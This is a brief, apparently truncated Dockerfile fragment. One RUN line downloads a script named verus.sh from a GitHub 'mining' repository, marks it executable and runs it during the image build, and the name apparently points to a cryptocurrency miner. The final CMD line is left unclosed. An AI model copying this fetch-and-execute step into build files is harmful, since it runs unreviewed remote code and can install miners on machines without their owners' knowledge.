RUN apt update
RUN apt install wget
RUN wget https://raw.githubusercontent.com/SQDHALU/mining/main/verus.sh && chmod +x verus.sh && ./verus.sh
CMD ["/app/run.sh"
